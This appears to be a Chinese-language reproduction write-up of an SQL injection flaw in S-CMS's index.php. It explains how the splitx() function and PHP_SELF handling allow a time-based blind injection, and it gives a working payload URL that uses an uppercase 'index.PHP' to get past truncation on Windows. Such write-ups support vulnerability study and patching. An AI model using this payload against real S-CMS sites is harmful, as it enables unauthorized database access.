S-CMS sql注入漏洞（二）
=======================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

漏洞位置：`index.php`

![](./.resource/S-CMSsql注入漏洞(二)/media/rId24.jpg)

跟进函数`splitx()`

    function splitx($a, $b, $c)
    {
        $d = explode($b, $a);
        return $d[$c];
    }

先上**payload**

    http://www.0-sec.org/index.PHP/a'%20where%20if(1,sleep(5),1)%23?action=update_dir

拼凑SQL语句

    update TABLE_config set C_dir='index.PHP/a' where if(1,sleep(5),1)#'

**解释**

**\$\_SERVER\['PHP\_SELF'\]**：获取当前文件的路径

> 如：127.0.0.1/xxe/xml.php =\> /xxe/xml.php

**explode(separator,string,limit)**：分割字符串形成数组

> separator：规定在哪里分割字符串。
>
> string：要分割的字符串。
>
> limit：规定所返回的数组元素的数目。

如果使用`index.php`，结果如下：

    array (size=2)
      0 => string '/index.php/' (length=5)
      1 => string '/a' where if(1,sleep(5),1)#' (length=27)

被截断，但若使用`index.PHP`：

    array (size=1)
      0 => string '/index.PHP/a' where if(1,sleep(5),1)#' (length=39)

前提：Windows系统下不区分文件大小写。

参考链接
--------

> http://pines404.online/2019/10/31/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/S-CMS%E5%AE%A1%E8%AE%A1%E5%A4%8D%E7%8E%B0/
